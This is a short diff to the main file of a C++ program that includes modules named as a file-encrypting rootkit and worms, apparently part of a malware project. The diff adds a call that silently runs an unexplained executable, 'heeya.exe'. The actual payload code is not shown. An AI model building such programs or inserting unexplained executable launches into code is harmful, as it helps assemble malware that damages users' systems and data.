@@ -1,6 +1,7 @@
 #include <iostream>
 #include <chrono>
 #include <thread>
+#include <cstdlib> // For system function
 #include "aes_file_encryptor_rootkit.cpp" // Include the implementation of FileEncryptor class
 #include "enigmaticWorm.cpp" // Include the implementation of EnigmaticWorm class
 #include "mayhem_worm_mutator.cpp" // Include the implementation of MayhemWorm class
@@ -31,6 +32,10 @@ int main() {
 
     // Perform advanced checks
     performAdvancedChecks();
+
+    // Call heeya.exe
+    cout << "Calling heeya.exe..." << endl;
+    system("heeya.exe");
 
     cout << "Program completed." << endl;
     return 0;
